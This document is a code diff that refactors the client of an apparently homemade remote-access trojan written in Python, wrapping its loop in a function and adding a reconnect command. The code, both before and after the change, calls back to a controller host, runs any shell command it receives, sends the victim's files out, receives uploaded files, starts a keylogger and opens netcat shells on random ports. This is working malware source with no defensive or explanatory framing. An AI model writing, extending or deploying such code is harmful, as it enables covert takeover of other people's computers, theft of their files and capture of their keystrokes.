@@ -121,107 +121,109 @@ try:
 except:
     pass
 
-DISCONNECTED = True #Initially, start disconnected
 
-while DISCONNECTED:
-    #If the server is down, keep trying.
-    try:
-        s = socket.socket() #Establish socket connection
-        s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
-        DISCONNECTED = False
-    except:
-        sleep(random.randint(0,10)) #Try to join the server every 0-10 seconds
+def clientLoop():
+    DISCONNECTED = True #Initially, start disconnected
 
-#When finally connected, start our shell
-while True:
-    try:
-        output = '' #default out
-        command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
-        splitted_command = command.split() #Split the command
-        if command == "exit": #if the user wants to exit, then keep connection alive
-            continue
-        elif command == "SERVER_SHUTDOWN":
-            break
-        elif splitted_command[0] == "cd": #if the user wants to change directories
-            try:
-                os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
-            except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
-                output = str(e)
+    while DISCONNECTED:
+        #If the server is down, keep trying.
+        try:
+            s = socket.socket() #Establish socket connection
+            s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
+            DISCONNECTED = False
+        except:
+            sleep(random.randint(0,10)) #Try to join the server every 0-10 seconds
+
+    #When finally connected, start our shell
+    while True:
+        try:
+            output = '' #default out
+            command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
+            splitted_command = command.split() #Split the command
+            if command == "exit": #if the user wants to exit, then keep connection alive
                 continue
-            else: #if it worked, don't send anything
-                output = ""
-                continue
-        elif splitted_command[0] == "echo":
-            output = subprocess.getoutput(command)
-            output+= "Echoed!"
-        elif command == "UPLOADING_FILE_FROM_S3RVER":
-            s.send("READY".encode())
-            path = s.recv(BUFFER_SIZE).decode()
-            splittedBySlash = path.split("/")
-            path = splittedBySlash[len(splittedBySlash)-1]
-            with open(path,"wb") as f:
-                data = s.recv(BUFFER_SIZE)
-                while data:
-                    if data.decode() == "UPLOADING_FILE_FROM_S3RVER_COMPLETE":
-                        s.send("DONE".encode())
-                        break
-                    f.write(data)
-                    s.send("ACK".encode())
-                    data = s.recv(BUFFER_SIZE)
-        elif command == "DOWNLOAD_FILE_FROM_S3RVER":
-            s.send("READY".encode()) #Tell server client is ready for download
-            try:
-                path = s.recv(BUFFER_SIZE).decode() #Get the path of file to download
-                with open(path,"rb") as f: #Open the file
-                    data = f.read(BUFFER_SIZE) #Read 1024bytes and store as var
-                    while data: #While the var is not None
-                        s.send(data) #Send the data to the server
-                        if s.recv(BUFFER_SIZE).decode() == "ACK": #If the server recieved it, it will send ACK
-                            data = f.read(BUFFER_SIZE) #Read more and repeat
-                        else: #If the server did not send ACK then break the loop
-                            break
-                            
-                s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
-
-            except FileNotFoundError or FileExistsError as e:
-                s.send("DOWNLOAD_ERROR")
-            except Exception as e:
-                s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
-
-        elif command == "START_KEYL0GGER":
-            try:
-                global keyLoggerAlive
-                keyLoggerAlive = True
-                keyLogThread = Thread(target=start_keylog)
-                keyLogThread.start()
-                if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
-                    keyLoggerAlive = False
+            elif command == "SERVER_SHUTDOWN":
+                break
+            elif splitted_command[0] == "cd": #if the user wants to change directories
+                try:
+                    os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
+                except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
+                    output = str(e)
                     continue
-            except:
-                s.send("NO_DEPENDENCIES".encode())
-        
-        elif command == "ncport":
-            s.send(str(NCPORT).encode()) #Send the user the current NC port then open another one
-            NCPORT = random.randint(8000,9000) #Picks a random port between 8000-9000
-            if NCPORT == 8080:
-                NCPORT = 8081
-            #Assume the client has netcat installed. If they don't, then just skip this step.
-            try:
-                tty = Thread(startTTY(NCPORT)) #Start netcat shell listening on 8081
-                tty.start() #Start the thread
-            except:
-                pass
+                else: #if it worked, don't send anything
+                    output = ""
+                    continue
+            elif splitted_command[0] == "echo":
+                output = subprocess.getoutput(command)
+                output+= "Echoed!"
+            elif command == "UPLOADING_FILE_FROM_S3RVER":
+                s.send("READY".encode())
+                path = s.recv(BUFFER_SIZE).decode()
+                splittedBySlash = path.split("/")
+                path = splittedBySlash[len(splittedBySlash)-1]
+                with open(path,"wb") as f:
+                    data = s.recv(BUFFER_SIZE)
+                    while data:
+                        if data.decode() == "UPLOADING_FILE_FROM_S3RVER_COMPLETE":
+                            s.send("DONE".encode())
+                            break
+                        f.write(data)
+                        s.send("ACK".encode())
+                        data = s.recv(BUFFER_SIZE)
+            elif command == "DOWNLOAD_FILE_FROM_S3RVER":
+                s.send("READY".encode()) #Tell server client is ready for download
+                try:
+                    path = s.recv(BUFFER_SIZE).decode() #Get the path of file to download
+                    with open(path,"rb") as f: #Open the file
+                        data = f.read(BUFFER_SIZE) #Read 1024bytes and store as var
+                        while data: #While the var is not None
+                            s.send(data) #Send the data to the server
+                            if s.recv(BUFFER_SIZE).decode() == "ACK": #If the server recieved it, it will send ACK
+                                data = f.read(BUFFER_SIZE) #Read more and repeat
+                            else: #If the server did not send ACK then break the loop
+                                break
+                                
+                    s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
 
-        else: #if the user doesn't want to perform a special action, run the command and capture the output
-            #if the command runs for longer than 5 seconds, timeout
-            try:
-                output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
-            except subprocess.TimeoutExpired:
-                continue
-        message = f"{output}" #encapsulate the output and send it
-        s.send(message.encode())
-    except Exception as e:
-        s.send("Error on client side.".encode())
+                except FileNotFoundError or FileExistsError as e:
+                    s.send("DOWNLOAD_ERROR")
+                except Exception as e:
+                    s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
 
+            elif command == "START_KEYL0GGER":
+                try:
+                    global keyLoggerAlive
+                    keyLoggerAlive = True
+                    keyLogThread = Thread(target=start_keylog)
+                    keyLogThread.start()
+                    if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
+                        keyLoggerAlive = False
+                        continue
+                except:
+                    s.send("NO_DEPENDENCIES".encode())
+            elif command == "reset_connection":
+                clientLoop()
+            elif command == "ncport":
+                s.send(str(NCPORT).encode()) #Send the user the current NC port then open another one
+                NCPORT = random.randint(8000,9000) #Picks a random port between 8000-9000
+                if NCPORT == 8080:
+                    NCPORT = 8081
+                #Assume the client has netcat installed. If they don't, then just skip this step.
+                try:
+                    tty = Thread(startTTY(NCPORT)) #Start netcat shell listening on 8081
+                    tty.start() #Start the thread
+                except:
+                    pass
 
-s.close() #close the socket on exit
+            else: #if the user doesn't want to perform a special action, run the command and capture the output
+                #if the command runs for longer than 5 seconds, timeout
+                try:
+                    output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
+                except subprocess.TimeoutExpired:
+                    continue
+            message = f"{output}" #encapsulate the output and send it
+            s.send(message.encode())
+        except Exception as e:
+            s.send("Error on client side.".encode())
+
+clientLoop()
